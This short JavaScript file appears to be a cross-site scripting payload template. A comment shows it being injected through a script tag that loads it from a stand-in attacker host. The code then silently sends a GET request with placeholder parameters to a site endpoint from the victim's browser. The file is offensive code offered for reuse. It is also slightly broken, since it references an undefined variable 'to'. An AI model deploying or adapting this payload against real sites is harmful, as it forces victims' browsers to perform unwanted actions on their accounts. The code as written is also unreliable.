// Script execution: <script src='http://attacker-ip:attacker_port/xhr_get.js'></script>

var val1 = "value1";
var val2 = "value2";

var uri = "/file.php/path/subpath/endpoint";

var query_string = "?param1=" + to + "&param2=" + val2;

function send_get_request(){
	xhr = new XMLHttpRequest();
	xhr.open("GET", uri + query_string, true);
	xhr.send(null);
}

send_get_request();
